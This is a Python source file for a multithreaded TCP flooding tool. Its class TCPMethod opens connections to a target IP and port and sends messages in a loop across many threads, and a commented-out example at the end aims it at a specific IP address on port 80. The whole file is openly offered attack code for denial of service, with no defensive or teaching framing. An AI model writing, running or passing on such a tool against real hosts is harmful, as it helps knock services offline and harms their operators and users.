import socket
import threading
import signal
from src.helpers import *

class TCPMethod:
    def __init__(self, target_ip, target_port, thread_count):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = thread_count

    def tcp_ddos_attack(self):
        # signal.signal(signal.SIGINT, Helpers.signal_handler)
        try:
            i = 0
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.target_ip, self.target_port))

            while True:
                i += 1
                msg = "I try to attack you"
                client.send(msg.encode("utf-8")[:1024])
                response = client.recv(1024).decode("utf-8")

                if response.lower() == "closed":
                    print(Fore.RED, f"Packet {i} not sent to : {self.target_ip} with status {response.lower()}")
                    break

                print(Fore.BLUE, f"Packet {i} sent to : {self.target_ip} with status {response.lower()}")

            client.close()
        except OSError as e:
            print(Fore.RED, f"Error: {e}")

    def start_attack(self):
        threads = []
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.tcp_ddos_attack)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

# attack = TCPMethod(target_ip="103.127.139.243", target_port=80, thread_count=10)
# attack.start_attack()